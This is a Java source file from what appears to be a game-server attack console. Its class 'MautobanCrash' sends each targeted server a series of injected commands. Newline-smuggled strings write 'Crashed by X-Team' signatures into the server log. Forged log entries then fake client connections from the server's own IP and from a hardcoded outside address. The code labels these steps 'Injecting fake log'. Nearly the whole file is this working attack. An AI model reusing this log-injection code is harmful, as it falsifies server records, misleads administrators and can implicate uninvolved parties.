/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package konsola;

import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Mateusz
 */
public class MautobanCrash extends Thread {

    Server el;

    static void crash() {
        for (Server el : Konsola.lista) {
            if (el.crash) {
                MautobanCrash s = new MautobanCrash(el);
                s.start();
            }
        }
    }

    public MautobanCrash(Server el) {
        this.el = el;
    }

    public void run() {
        mautobanCrash();
    }

    void mautobanCrash() {
        try {
            CrashLog log = new CrashLog(el.name, el.ips);
            String cmd = "/sv finger' run from " + el.ip + ":" + el.port + "\n[00:00:00] Crashed by X-Team!!! Crashed by X-Team!!!  "
                    + " Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!! "
                    + " Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!! Crashed by X-Team!!!";
            log.log.append("Injecting signature to log...\n");
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            el.sendStrPck(cmd);
            log.log.append("Injecting fake log...\n");
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] Server info sent to " + el.ip + ":9234"
                    + "\n[04:23:11] Network_AddToLoadQueue: [" + el.ip + ":9234" + "]"
                    + "\n[04:23:11] NETWORKPACKET_TYPE_CLIENTCONNECT [" + el.ip + ":9240" + "]\n                              \n ";
            el.sendStrPck(cmd);
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] IsClientMapCorrect: Client 3 Server  3 "
                    + "\n[04:23:11] Granted access to [" + el.ip + ":9240" + "][04:23:11]"
                    + "\n[04:23:11] NETWORKCONNECTIONRESPONSE_SUCCESS [" + el.ip + ":9240" + "]\n                         \n ";
            el.sendStrPck(cmd);
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] Popped new networkID for joining client: [1][" + el.ip + ":9240" + "] \n"
                    + "[04:23:11] Received [CRPL] from unknown source[1] \n"
                    + "[04:23:11] TeamManager: Selecting INPUT TEAM (was balanced\n                \n ";
            el.sendStrPck(cmd);
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] Server info sent to 65.112.87.186:9234"
                    + "\n[04:23:11] Network_AddToLoadQueue: [65.112.87.186:9234" + "]"
                    + "\n[04:23:11] NETWORKPACKET_TYPE_CLIENTCONNECT [65.112.87.186:9240" + "]\n                              \n ";
            el.sendStrPck(cmd);
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] IsClientMapCorrect: Client 3 Server  3 "
                    + "\n[04:23:11] Granted access to [65.112.87.186:9240" + "][04:23:11]"
                    + "\n[04:23:11] NETWORKCONNECTIONRESPONSE_SUCCESS [65.112.87.186:9240" + "]\n                         \n ";
            el.sendStrPck(cmd);
            cmd = "/sv crash' run from " + el.ip + ":" + el.port + "\n[04:23:11] Popped new networkID for joining client: [1][65.112.87.186:9240" + "] \n"
                    + "[04:23:11] Received [CRPL] from unknown source[1] \n"
                    + "[04:23:11] TeamManager: Selecting INPUT TEAM (was balanced\n                \n ";
            el.sendStrPck(cmd);
            log.log.append("Fake Log was injected!\n");
            log.time.setText("Close for 3 sec");
            Thread.sleep(1000);
            log.time.setText("Close for 2 sec");
            Thread.sleep(1000);
            log.time.setText("Close for 1 sec");
            Thread.sleep(1000);
            log.dispose();
        } catch (InterruptedException ex) {
            Logger.getLogger(MautobanCrash.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

}
